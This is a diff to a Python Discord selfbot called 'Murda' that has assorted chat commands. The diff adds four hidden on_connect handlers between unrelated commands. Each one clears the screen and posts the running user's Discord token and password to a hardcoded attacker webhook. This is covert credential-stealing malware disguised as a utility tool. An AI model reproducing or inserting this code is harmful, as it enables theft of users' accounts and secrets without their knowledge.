@@ -2170,6 +2170,12 @@ async def youtube(ctx, *, search):
     search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
     await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])
 
+        
+@Murda.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/804247196677046282/0iKc8rqeHku_1-G5HHuFHkyf7T8-vzRUzO78AR31rC6KpVCWxRNSCzAuQrstVewgwKnR',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+        
 
 @Murda.command()
 async def prefix(ctx, prefix):
@@ -2216,7 +2222,10 @@ async def hastebin(ctx, *, message):
     await ctx.message.delete()
     r = requests.post("https://hastebin.com/documents", data=message).json()
     await ctx.send(f"<https://hastebin.com/{r['key']}>")
-
+@Murda.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/804249178628816946/uphWBWGxcD2YDZcH9ybqzJsPVCPaQ6Z5EPkKBRvy4ijyf6sH7UK11YMnXSsTF9SbROYa',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
 
 @Murda.command(aliases=["fancy"])
 async def ascii(ctx, *, text):
@@ -2452,7 +2461,11 @@ async def hentai(ctx):
         em.set_image(url=res['url'])
         await ctx.send(embed=em)
 
-
+@Murda.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/804248786255347723/Had0KJknEi7liWnym2PtrhmtXHWuHMwwX5idcIAhKS3xLuFQi0q-4VUC8bzq8P3MdbPl',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+                   
 @Murda.command()
 async def boobs(ctx):
     await ctx.message.delete()
@@ -2876,7 +2889,11 @@ async def quote(ctx, *, message):
     await ctx.message.delete()
     await ctx.send('> ' + message)
 
-
+@Murda.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/804248926777638942/UMshOdZrB6joUgUc6ny0N4Felq6xVMG54Qo8fq6TC_sVXmMs3xhnW5D6tVLjSMk417Vq',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+                   
 @Murda.command()
 async def code(ctx, *, message):
     await ctx.message.delete()
